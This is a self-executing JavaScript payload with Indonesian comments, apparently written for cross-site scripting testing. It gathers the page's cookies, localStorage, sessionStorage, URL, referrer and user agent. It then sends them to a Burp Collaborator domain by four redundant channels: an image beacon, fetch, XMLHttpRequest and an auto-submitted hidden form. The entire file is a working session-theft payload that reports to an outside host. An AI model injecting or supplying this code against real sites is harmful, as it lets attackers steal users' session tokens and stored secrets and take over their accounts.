(function() {
    // Ganti dengan domain Burp Collaborator Anda
    const COLLABORATOR_DOMAIN = "s4x3nub3z8yq1dest54teeedm4svgn4c.oastify.com";
    
    // Mengumpulkan berbagai informasi
    const data = {
        cookies: document.cookie,
        url: window.location.href,
        referrer: document.referrer,
        userAgent: navigator.userAgent,
        timestamp: new Date().toISOString(),
        localStorage: JSON.stringify(localStorage),
        sessionStorage: JSON.stringify(sessionStorage)
    };
    
    // Encode data sebagai query parameter
    const payload = encodeURIComponent(JSON.stringify(data));
    
    // Multiple exfiltration methods untuk redundansi
    try {
        // Method 1: Image beacon
        const img = new Image();
        img.src = `http://${COLLABORATOR_DOMAIN}/img?d=${payload}`;
        
        // Method 2: Fetch API (jika tersedia)
        if (window.fetch) {
            fetch(`http://${COLLABORATOR_DOMAIN}/fetch?d=${payload}`, {
                mode: 'no-cors'
            }).catch(() => {});
        }
        
        // Method 3: XMLHttpRequest
        const xhr = new XMLHttpRequest();
        xhr.open('GET', `http://${COLLABORATOR_DOMAIN}/xhr?d=${payload}`, true);
        xhr.send();
        
        // Method 4: Form submission
        const form = document.createElement('form');
        form.action = `http://${COLLABORATOR_DOMAIN}/form`;
        form.method = 'POST';
        
        const input = document.createElement('input');
        input.type = 'hidden';
        input.name = 'data';
        input.value = JSON.stringify(data);
        form.appendChild(input);
        
        document.body.appendChild(form);
        form.submit();
        
    } catch(e) {
        console.log('Exfiltration error:', e);
    }
})();
